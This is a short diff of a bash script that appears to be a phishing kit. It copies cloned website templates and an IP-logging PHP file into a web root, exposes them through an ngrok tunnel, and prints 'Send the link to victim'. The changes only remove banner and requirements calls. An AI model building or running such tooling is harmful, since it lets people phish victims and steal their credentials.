@@ -116,7 +116,6 @@ cp -rf .Modules/$website/* .htr/www
 cp -f .Modules/ip.php .htr/www/
 
 def_tunnel_menu="2"
-smallbanner
 printf "\e[0m\e[33m [\e[0m01\e[0m\e[32m]\e[0m\e[37m LocalHost\e[0m\n"
 printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[36m Ngrok\e[0m\n"
 printf "\e[0m\e[91m [\e[0m03\e[0m\e[91m]\e[0m\e[93m Serveo \e[0m\e[91m[\e[0m\e[93mCurrently Down\e[0m\e[91m]\e[0m\n"
@@ -173,7 +172,6 @@ sleep 2
 sleep 7
 ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 
-smallbanner
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $ngrok_link
 
@@ -378,5 +376,4 @@ done
 }
 
 banner
-reqs
 menu
